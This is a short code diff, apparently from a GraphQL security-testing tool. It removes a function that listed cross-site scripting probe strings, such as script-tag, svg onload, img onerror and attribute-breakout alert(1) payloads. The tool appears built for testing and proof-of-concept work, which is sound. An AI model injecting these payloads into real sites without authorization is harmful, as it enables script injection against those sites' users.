@@ -692,16 +692,3 @@ def build_poc_html(
             "  </script>\n"
         )
     return header + body + footer
-
-
-def dangerous_payloads() -> list[str]:
-    """High-yield GraphQL XSS payloads for testing."""
-    return [
-        DEFAULT_ALIAS_PAYLOAD,            # alias-based
-        DEFAULT_ARGUMENT_PAYLOAD,         # argument-based
-        "<script>alert(1)</script>",      # classic
-        "javascript:alert(1)",            # URL-context
-        "<svg/onload=alert(1)>",
-        "<img src=x onerror=alert(1)>",
-        "\"><script>alert(1)</script>",   # attribute breakout
-    ]
